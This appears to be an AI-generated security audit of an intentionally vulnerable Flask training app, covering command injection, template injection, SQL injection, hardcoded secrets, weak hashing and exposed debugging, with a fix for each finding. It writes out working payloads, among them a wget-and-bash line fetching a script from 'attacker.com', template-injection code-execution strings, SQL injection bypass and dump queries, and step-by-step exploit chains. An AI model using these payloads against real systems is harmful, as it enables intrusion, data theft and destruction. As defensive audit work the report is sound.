# Security Investigation Report

**Target:** `./test-app`
**Date:** 2026-05-02
**Agent:** Claude Security Investigator (TypeScript) v1.0
**Files analyzed:** 3 (`app.py`, `requirements.txt`, `README.md`)

---

## Executive Summary

This Flask application is a deliberately vulnerable single-file Python web service (136 lines) exposing SQLite over HTTP. The overall security posture is **critically poor**: four unauthenticated endpoints enable direct remote code execution, and every major OWASP Top 10 category is represented. A total of **14 findings** were identified — 4 Critical, 6 High, 3 Medium, and 1 Low — with multiple exploitable chains that compound individual weaknesses into full server compromise achievable in under five minutes by an unskilled attacker.

---

## Critical Findings

### [CRITICAL-1] Command Injection in `/ping` via `shell=True`
**Location:** `app.py:107–109`
**Description:** The `/ping` endpoint accepts a `host` query parameter and passes it verbatim into a shell command string via `subprocess.run(..., shell=True)`. Any shell metacharacter sequence (`; | && ||  $()`) is interpreted by `/bin/sh`, granting the attacker arbitrary OS command execution as the process user. No authentication guards this endpoint.
**Evidence:**
```python
result = subprocess.run(
    f"ping -c 1 {host}", shell=True, capture_output=True, text=True
)
```
**Exploitability:** **Directly reachable** via unauthenticated `GET /ping?host=localhost;id`. Payloads such as `localhost; cat /etc/passwd`, `localhost; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s`, or reverse-shell one-liners execute instantly with no preconditions. This is a one-shot, unauthenticated RCE.
**Remediation:** Remove `shell=True`; pass arguments as a list and validate input strictly:
```python
import re, subprocess
if not re.fullmatch(r'[a-zA-Z0-9.\-]+', host):
    return jsonify({"error": "invalid host"}), 400
subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
```

---

### [CRITICAL-2] Server-Side Template Injection (SSTI) in `/render`
**Location:** `app.py:117–118`
**Description:** The `/render` endpoint concatenates the user-supplied `name` parameter directly into a Jinja2 template string, then calls `render_template_string()`. Jinja2 evaluates `{{ ... }}` expressions in the rendered string, allowing an attacker to execute arbitrary Python code via introspection gadgets. No authentication guards this endpoint.
**Evidence:**
```python
template = "<h1>Hello, " + name + "!</h1>"
return render_template_string(template)
```
**Exploitability:** **Directly reachable** via `GET /render?name={{7*7}}` (returns `49` — confirming injection). Full RCE payload:
```
GET /render?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
Returns `uid=...` — server is fully compromised. Additionally, `GET /render?name={{config}}` dumps the entire Flask config, including the hardcoded `SECRET_KEY = "supersecret"` (see CRITICAL-4 chain).
**Remediation:** Never concatenate user input into a template string. Use a static template file and pass data as a context variable:
```python
return render_template("hello.html", name=name)  # Jinja2 auto-escapes
```

---

### [CRITICAL-3] SQL Injection in `/login` — Authentication Bypass
**Location:** `app.py:58–64`
**Description:** The `/login` endpoint builds its SQL query by string-concatenating the user-supplied `username` directly into the query. Because the password is MD5-hashed before concatenation, only the `username` field is injectable — but that is sufficient to bypass all authentication.
**Evidence:**
```python
query = (
    "SELECT * FROM users WHERE username = '"
    + username
    + "' AND password_hash = '"
    + password_hash
    + "'"
)
row = conn.execute(query).fetchone()
```
**Exploitability:** **Directly reachable** via `POST /login` with body `{"username": "admin' OR '1'='1'--", "password": "x"}`. The injected query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password_hash = '...'
```
This returns the first row in the table (typically admin) regardless of password, granting full admin session. A UNION-based injection can also dump all password hashes for offline cracking.
**Remediation:** Use parameterized queries exclusively:
```python
row = conn.execute(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?",
    (username, password_hash)
).fetchone()
```

---

### [CRITICAL-4] SQL Injection in `/search` — Unauthenticated Data Exfiltration
**Location:** `app.py:78–80`
**Description:** The `/search` endpoint concatenates the `q` query parameter directly into a `LIKE` clause. This unauthenticated `GET` endpoint allows blind and UNION-based SQL injection to exfiltrate all data from the SQLite database.
**Evidence:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE '%" + term + "%'"
).fetchall()
```
**Exploitability:** **Directly reachable** via:
```
GET /search?q=a%' UNION SELECT id, password_hash FROM users--
```
Returns all password hashes for offline cracking. Because the only table is `users`, the attacker gains every username, MD5 hash (trivially crackable), and role assignment with a single unauthenticated HTTP request.
**Remediation:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE ?",
    (f"%{term}%",)
).fetchall()
```

---

## High Findings

### [HIGH-1] Missing Authentication on All `/admin/*` Endpoints
**Location:** `app.py:86–100`
**Description:** Both admin endpoints have zero authentication or authorization guards — no session check, no token validation, no role verification. Any anonymous HTTP client can enumerate every user account and delete any user by ID.
**Evidence:**
```python
@app.route("/admin/users")
def admin_list_users():
    rows = conn.execute("SELECT id, username, role FROM users").fetchall()
    ...

@app.route("/admin/delete/<int:user_id>", methods=["POST"])
def admin_delete_user(user_id):
    conn.execute("DELETE FROM users WHERE id = ?", (user_id,))
    ...
```
**Exploitability:** `GET /admin/users` returns a JSON list of all accounts with roles. `POST /admin/delete/1` through `/admin/delete/N` deletes all users. An attacker can wipe the entire user database in a single loop.
**Remediation:** Add an authentication decorator that validates a JWT or session cookie and checks `role == 'admin'`. Apply it to all `/admin/*` routes. Return HTTP 401/403 on failure.

---

### [HIGH-2] Hardcoded Production Secrets in Source Code
**Location:** `app.py:13–15, 20`
**Description:** Three secrets are hardcoded as module-level string literals: a production API key, a database password, and a JWT signing secret. The JWT secret is also assigned as the Flask `SECRET_KEY`, meaning it signs session cookies. Any party with source code access (every developer, CI/CD pipeline, container image layer, or git repository clone) possesses these credentials.
**Evidence:**
```python
API_KEY    = "sk-prod-7c4e9f2a1b8d3e6f5a9c0d4e8f1b2a7c"
DB_PASSWORD = "admin123"
JWT_SECRET  = "supersecret"
...
app.config["SECRET_KEY"] = JWT_SECRET
```
**Exploitability:** With `JWT_SECRET = "supersecret"`, an attacker can forge valid Flask session cookies for any user (including admin) using `flask-unsign` or a custom script, without needing to authenticate at all. The production API key (`sk-prod-...` prefix) grants access to whatever external service the application uses.
**Remediation:** Load all secrets from environment variables. Rotate the exposed credentials immediately:
```python
import os
API_KEY     = os.environ["API_KEY"]
DB_PASSWORD = os.environ["DB_PASSWORD"]
JWT_SECRET  = os.environ["JWT_SECRET"]
```
Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production.

---

### [HIGH-3] Weak Password Hashing (MD5, Unsalted) + Hardcoded Admin Hash
**Location:** `app.py:41, 54`
**Description:** Passwords are hashed using MD5 without a salt. MD5 is cryptographically broken for password storage: it is fast (billions of hashes/second on commodity hardware), has no computational cost parameter, and is fully covered by rainbow table databases. The admin password hash is also hardcoded directly in the `init_db()` function, making it statically visible to anyone with source access.
**Evidence:**
```python
# In init_db():
VALUES ('admin', '0192023a7bbd73250516f069df18b500', 'admin');

# In login():
password_hash = hashlib.md5(password.encode()).hexdigest()
```
**Exploitability:** The hardcoded hash `0192023a7bbd73250516f069df18b500` is immediately crackable via free online MD5 reverse-lookup databases (e.g., crackstation.net). Combined with the `/login` endpoint, an attacker can authenticate as admin with the recovered plaintext in under one second. All user passwords are equally vulnerable after an SQL injection dump.
**Remediation:** Replace MD5 with Argon2 or bcrypt:
```python
from werkzeug.security import generate_password_hash, check_password_hash
# Store: generate_password_hash(password, method='scrypt')
# Verify: check_password_hash(stored_hash, password)
```
Never hardcode credential material in source. Generate initial admin passwords at deployment time.

---

### [HIGH-4] Outdated and Vulnerable Dependencies
**Location:** `requirements.txt:1–3`
**Description:** All three pinned packages are from May–June 2021 — nearly five years old as of this report. Werkzeug and Flask have accumulated multiple security advisories in the intervening years, including issues with the interactive debugger, path handling, and request parsing.
**Evidence:**
```
Flask==2.0.1
flask-cors==3.0.10
Werkzeug==2.0.1
```
Notable vulnerability categories in the 2021–2026 window for these packages:
- **Werkzeug**: multipart boundary parsing DoS (CVE-2023-25577), high-severity debug-console issues, and path traversal in `FileStorage.save()` (CVE-2023-46136)
- **Flask**: dependency on the above Werkzeug versions chains all Werkzeug CVEs
- **flask-cors 3.0.10**: superseded by 4.x with fixes for header-handling edge cases

**Exploitability:** Dependent on which CVEs are applicable in the deployment environment. The debug console vulnerability class is particularly relevant given that `DEBUG=True` and `host="0.0.0.0"` are both set (see HIGH-5).
**Remediation:** Upgrade to current stable versions (`Flask>=3.0`, `Werkzeug>=3.0`, `flask-cors>=4.0`). Add `pip-audit` or `safety` to CI to catch future regressions.

---

### [HIGH-5] Werkzeug Debug Console Exposed on All Network Interfaces
**Location:** `app.py:19, 135`
**Description:** The application enables Flask/Werkzeug debug mode and binds to `0.0.0.0`, making the Werkzeug interactive debugger accessible to any host on the network. While the debugger is PIN-protected, the PIN is deterministically derived from machine properties (hostname, MAC address, `/proc` values) and can be calculated by an attacker who has read access to those values — for example, via the SSTI vulnerability (CRITICAL-2).
**Evidence:**
```python
app.config["DEBUG"] = True
...
app.run(host="0.0.0.0", port=5000, debug=True)
```
**Exploitability:** An attacker who can read `/proc/sys/kernel/random/boot_id`, `/proc/self/cgroup`, and the server's MAC address (possible via SSTI in CRITICAL-2) can calculate the Werkzeug debug PIN and execute arbitrary Python through the browser-based REPL at `/__debugger__`. This is a well-documented attack chain.
**Remediation:** Set `DEBUG=False` in all non-local environments. Use an environment variable gate:
```python
app.config["DEBUG"] = os.getenv("FLASK_DEBUG", "false").lower() == "true"
```
For production, use a production WSGI server (Gunicorn, uWSGI) — never `app.run()`.

---

### [HIGH-6] CORS Wildcard Origin Combined with `supports_credentials=True`
**Location:** `app.py:21`
**Description:** CORS is configured to allow all origins (`*`) while simultaneously enabling credential inclusion (`supports_credentials=True`). This configuration signals intent to allow authenticated cross-origin requests from any domain. Modern browsers enforce that `Access-Control-Allow-Origin: *` cannot be combined with `Access-Control-Allow-Credentials: true` and will block such responses — but non-browser clients (curl, scripted tools, older browsers) are not subject to this constraint.
**Evidence:**
```python
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
```
**Exploitability:** Medium-High. Browser CORS enforcement mitigates the most dangerous scenario (session-riding attacks from arbitrary websites). However: (1) the configuration is incorrect and likely to be "fixed" in a way that introduces the actual vulnerability; (2) mobile apps, native clients, and server-to-server calls bypass CORS entirely; (3) any future change to reflect the `Origin` header (a common "fix") immediately enables full CSRF attacks against all endpoints including unauthenticated `/admin/delete`.
**Remediation:** Restrict to explicit trusted origins and ensure credentials are only sent to those:
```python
CORS(app, origins=["https://yourdomain.com"], supports_credentials=True)
```

---

## Medium Findings

### [MEDIUM-1] Full Python Stack Traces Returned to Clients
**Location:** `app.py:121–129`
**Description:** The global exception handler serializes `traceback.format_exc()` into every HTTP 500 response. This discloses internal file paths, library versions, function names, and execution context to any caller who can trigger an error.
**Evidence:**
```python
@app.errorhandler(Exception)
def handle_error(e):
    import traceback
    return (
        jsonify({"error": str(e), "trace": traceback.format_exc()}),
        500,
    )
```
**Exploitability:** Any malformed request that causes an unhandled exception leaks stack trace information. Particularly valuable during SQL injection development (reveals query structure on parse errors) and SSTI probing. Reduces time-to-exploit for all Critical findings above.
**Remediation:** Log the trace server-side; return a generic message to clients:
```python
import logging
logging.exception("Unhandled error")
return jsonify({"error": "Internal server error"}), 500
```

---

### [MEDIUM-2] No Rate Limiting on the `/login` Endpoint
**Location:** `app.py:48–70`
**Description:** The login endpoint has no throttling, lockout, or CAPTCHA mechanism. Combined with MD5 password hashing (HIGH-3), an attacker can attempt thousands of password guesses per second against any account.
**Evidence:** No `Flask-Limiter` decorator, no failed-attempt counter, no `time.sleep()` or account lockout logic on the `/login` route.
**Exploitability:** Easily brute-forced. A modest 1,000 req/s attack against the `admin` account would exhaust a 10-character lowercase password space in hours. With MD5 and rainbow tables the attack is largely offline once hashes are obtained via SQL injection.
**Remediation:** Add Flask-Limiter (`pip install flask-limiter`):
```python
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login(): ...
```
Implement account lockout after 5 consecutive failures.

---

### [MEDIUM-3] Missing HTTP Security Headers
**Location:** `app.py` (no `after_request` handler present)
**Description:** The application sets no standard HTTP security headers. This leaves clients unprotected against clickjacking, MIME-sniffing, and cross-site scripting in rendered HTML responses.
**Evidence:** No `after_request` hook or `flask-talisman` integration exists anywhere in the application.
**Missing headers include:**
- `Content-Security-Policy` — blocks XSS and data injection
- `X-Frame-Options: DENY` — prevents clickjacking
- `X-Content-Type-Options: nosniff` — prevents MIME-type sniffing
- `Strict-Transport-Security` — enforces HTTPS
- `Referrer-Policy` — limits referrer leakage
**Exploitability:** Low in isolation; meaningful amplifier for XSS scenarios introduced by the SSTI finding. The `/render` endpoint returns HTML (`<h1>...</h1>`) with no CSP, making injected JavaScript execute in the user's browser without any browser-side mitigation.
**Remediation:** Use `flask-talisman`:
```python
from flask_talisman import Talisman
Talisman(app, content_security_policy={"default-src": "'self'"})
```

---

## Low Findings

### [LOW-1] Application Bound to `0.0.0.0` Without Network Segmentation
**Location:** `app.py:135`
**Description:** `app.run(host="0.0.0.0")` listens on all network interfaces, exposing the service to every network segment the host is connected to. As a standalone issue this is low severity — legitimate services often bind broadly and rely on firewall rules — but it materially amplifies every other finding in this report.
**Evidence:**
```python
app.run(host="0.0.0.0", port=5000, debug=True)
```
**Exploitability:** Low as a standalone finding. Significant as an amplifier: the Werkzeug debug console (HIGH-5), all unauthenticated endpoints, and every injection vulnerability become network-wide rather than localhost-only risks.
**Remediation:** During development, bind to `127.0.0.1`. In production, place the application behind a reverse proxy (nginx/Caddy) that handles TLS termination and restricts the upstream bind to localhost.

---

## Vulnerability Chains

### Chain A — Unauthenticated Full Database Takeover (CRITICAL-3/4 + HIGH-1 + HIGH-3)
**Severity:** Critical | **Steps:** 2 HTTP requests

1. `GET /admin/users` (no auth required) → retrieves all user IDs and usernames, confirming `admin` account ID.
2. `GET /search?q=a%' UNION SELECT id, password_hash FROM users--` → dumps all MD5 password hashes.
3. MD5 hashes are cracked instantly via rainbow tables (the admin hash is a known weak password per the source).
4. `POST /login {"username": "admin", "password": "<cracked>"}` → authenticated admin session.

**Impact:** Full administrative access to the application without any prior credentials.

---

### Chain B — SSTI to Werkzeug Debug Console RCE (CRITICAL-2 + HIGH-2 + HIGH-5)
**Severity:** Critical | **Steps:** 3–4 HTTP requests

1. `GET /render?name={{config}}` → dumps Flask config including `SECRET_KEY = "supersecret"`, confirming the hardcoded JWT secret.
2. `GET /render?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat /proc/sys/kernel/random/boot_id').read()}}` → reads boot ID needed to calculate Werkzeug debugger PIN.
3. Attacker calculates the Werkzeug PIN using the leaked boot ID, machine ID, and MAC address.
4. Accesses `http://host:5000/__debugger__` with the computed PIN → unrestricted Python REPL on the server.

**Impact:** Two independent paths to full server RCE from a single endpoint. The SSTI itself already provides RCE; the debug console provides a persistent interactive foothold.

---

### Chain C — SQL Injection Bypasses Auth Gate then Escalates to Admin Deletion (CRITICAL-3 + HIGH-1)
**Severity:** Critical | **Steps:** 2 HTTP requests

1. `POST /login {"username": "admin' OR '1'='1'--", "password": "x"}` → logs in as admin with no valid credentials.
2. `GET /admin/users` → enumerates all user IDs.
3. `POST /admin/delete/<id>` for each ID → wipes every user account from the database.

**Impact:** Complete destruction of the user database by an unauthenticated attacker. Even without step 1, step 2 and 3 require no auth at all.

---

### Chain D — Command Injection + Stack Traces = Assisted RCE (CRITICAL-1 + MEDIUM-1)
**Severity:** Critical | **Steps:** 1 HTTP request

1. `GET /ping?host=localhost;invalid_command` → triggers a subprocess error, and the global exception handler returns the full Python stack trace in the response body, revealing the application's directory structure, Python version, and import paths.
2. Attacker uses this intel to craft a targeted RCE payload (e.g., to locate and exfiltrate config files or write a web shell).

**Impact:** Stack trace disclosure accelerates and refines command injection exploitation.

---

## Positive Observations

- **The `/admin/delete` endpoint uses a parameterized query** (`DELETE FROM users WHERE id = ?`) — the one endpoint that correctly avoids SQL injection for its core operation. This shows awareness of the pattern; it was simply not applied consistently.
- **Integer type conversion on `user_id`** in the route definition (`<int:user_id>`) implicitly validates that the path segment is a non-negative integer, preventing string injection via the URL path.
- **Database connections are explicitly closed** after every query (`conn.close()`), preventing file descriptor leaks under normal operation.
- **`POST` method is used for state-changing operations** (`/login`, `/admin/delete`) rather than `GET`, providing at least nominal alignment with REST semantics and slight CSRF friction (though negated by the wildcard CORS config).
- **The application is clearly marked as intentionally vulnerable** both in its docstring and README, indicating it was created as a controlled training target rather than being an accidentally insecure production service.

---

## Recommendations

1. **[Immediate] Rotate all three hardcoded secrets** (`API_KEY`, `DB_PASSWORD`, `JWT_SECRET`) — they are already compromised by virtue of being in source code. Move to environment variables before any other change.

2. **[Immediate] Fix the four injection vulnerabilities** (CRITICAL-1 through CRITICAL-4): switch `subprocess.run` to a list without `shell=True`; use a static template file instead of `render_template_string`; apply parameterized queries to both SQL endpoints. These are all one-line fixes with zero functional change.

3. **[Same sprint] Add authentication to `/admin/*` endpoints** — a simple JWT or session check decorator applied to both routes closes the unauthenticated user enumeration and deletion risk entirely.

4. **[Same sprint] Replace MD5 with a modern KDF** (Argon2 or `werkzeug.security.generate_password_hash` with `scrypt`). Migrate existing hashes on next login.

5. **[Same sprint] Set `DEBUG=False`** and bind to `127.0.0.1` or deploy behind a reverse proxy. Never ship `app.run()` to production — use Gunicorn or uWSGI.

6. **[Next sprint] Upgrade all dependencies** to current stable versions (`Flask>=3.0`, `Werkzeug>=3.0`, `flask-cors>=4.0`). Add `pip-audit` to CI to prevent regression.

7. **[Next sprint] Restrict CORS** to a specific list of trusted origins. Remove `supports_credentials=True` unless cross-origin authentication is genuinely required, and never pair it with a wildcard origin.

8. **[Next sprint] Add security headers** via `flask-talisman` or a custom `after_request` handler (CSP, `X-Frame-Options`, `X-Content-Type-Options`, HSTS).

9. **[Ongoing] Suppress stack traces in error responses** — log them server-side, return `{"error": "Internal server error"}` to clients.

10. **[Ongoing] Add rate limiting to `/login`** with `flask-limiter` and implement account lockout after repeated failures.
